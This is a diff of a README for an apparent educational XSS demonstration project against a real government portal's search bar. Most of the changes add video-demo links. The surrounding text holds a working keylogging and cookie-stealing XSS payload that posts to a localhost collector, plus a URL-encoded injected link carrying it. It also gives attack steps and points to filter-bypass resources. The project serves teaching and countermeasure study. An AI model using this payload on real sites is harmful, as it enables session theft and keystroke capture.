@@ -45,8 +45,8 @@ The following components needs to be installed to replicate the demo
   Enter the above codes in the [TT-Connect](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ38Aw0sDYyCPA1dDUy9jd29DIAKIoEKDHAARwNC-r3ACvDoB1pgVOTr7JuuH1WQWJKhm5mXlq8fUVKSnJ-Xl5pcoh-uH4VmR5C7G9AOV1NDD-8wY6AhUAV47CjIjajySQv2BACEOlbd/dl5/d5/L2dBISEvZ0FBIS9nQSEh/) Website as our example. search bar to see the result. 
   
   You should get the following results:
-  * On a XSS Filtered enabled browser, only HTML test will pass
-  * On a XSS Filtered disabled browser, all test except Plain Javascript test will pass
+  * On a XSS Filtered enabled browser, only HTML test will pass. **[View Video Demo](https://drive.google.com/file/d/1JsBYC4222L_-DFo0I2-mDrtOHYPwihle/view?usp=sharing)**
+  * On a XSS Filtered disabled browser, all test except Plain Javascript test will pass. **[View Video Demo](https://drive.google.com/file/d/10z-Yqr4nNumjXETJ8X7t249CsBuKsmYT/view?usp=sharing)**
  
 ### Design your malicious script
 We have designed the following script to attack our target websites
@@ -67,7 +67,7 @@ Usable Minimized Version
  <img hidden src='x' onerror="document.onkeypress=function(e){ var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"/>
 ```
 
-### Perform a Reflected XSS Attack
+### Perform a Reflected XSS Attack - [View Video Demo](https://drive.google.com/file/d/1bnmG9OYbcV1Egnb53ilj0qY4ivPTyPVC/view?usp=sharing)
 * Clone this project
   ```
   git clone https://github.com/HaifengMei/ttconnect-xss.git
@@ -91,7 +91,7 @@ Usable Minimized Version
 
 * Open sessiondata.txt in your project root directory to see logged information
 
-### Perform a Stored XSS Attack
+### Perform a Stored XSS Attack - [View Video Demo](https://drive.google.com/file/d/1PAJMY-AO7YvaJK1IcH_j9ex_FPYhEXMh/view?usp=sharing)
 * Ensure the attack server is running
 * Access the following
 [Vulnerable Forum](https://xss-game.appspot.com/level2/frame)
@@ -108,7 +108,7 @@ Usable Minimized Version
 
 * Open sessiondata.txt in your project root directory to see logged information
 
-### Perform a DOM-based XSS Attack
+### Perform a DOM-based XSS Attack - [View Video Demo](https://drive.google.com/file/d/1svetI989YoEaJSnx0pikjfTN1kuN4z6Q/view?usp=sharing)
 * Ensure the attack server is running
 * The website current contains no cookies, you may set the cookie to a value for demonstration purposes
   * Juse open console with F12 and type the following and press enter
@@ -122,7 +122,7 @@ Usable Minimized Version
 
 * Open sessiondata.txt in your project root directory to see logged information
 
-### Counter Measures
+### Counter Measures - [View Video Demo](https://drive.google.com/file/d/1HMb8bAWwBZwK1KFxKCdgIqj4igcu7vBp/view?usp=sharing)
 * [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
   * Try [Injected TT Connect Link](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ0sfLycDYyCfM1CLf0MDA3cDYEKIpEV-Ae5uwEVuJoaeniHGRsYGBCn3wAHcCSoP1w_ClWJf6CBJVCJp6Grgam3sbuXAYYCTCeCFeBxQ0FuaIRBpqciAKjdE-c!/dl5/d5/L2dBISEvZ0FBIS9nQSEh/?searchKeyword=++++%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E&ctl00%24HomeSearchBar1%24HiddenField1=&selectedCategory=entireSite&ctl00%24HomeSearchBar1%24submit_button.x=0&ctl00%24HomeSearchBar1%24submit_button.y=0) on a XSS-Filter enabled browser, it will get blocked
   
@@ -143,7 +143,7 @@ Usable Minimized Version
    ```
    <img src="http://inexist.ent" onerror="javascript:alert(1)"/>
    ```
-### XSS Filter Bypass
+### XSS Filter Bypass - [View Video Demo](https://drive.google.com/file/d/19UjoPuIhOKG22aEnhqqd9Xf9lj-iLVRR/view?usp=sharing)
 Although X-XSS-Protection designed into browser works for common attacks, there exits [bypasses](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) that allow hackers to execute their malicious scripts.
 
 A Japanese hacker posted a [github repo](https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet#ieedge%E3%81%AExss%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%BC) that contains some working bypass for the latest XSS filters in Chrome, IE11/Edge and Safari
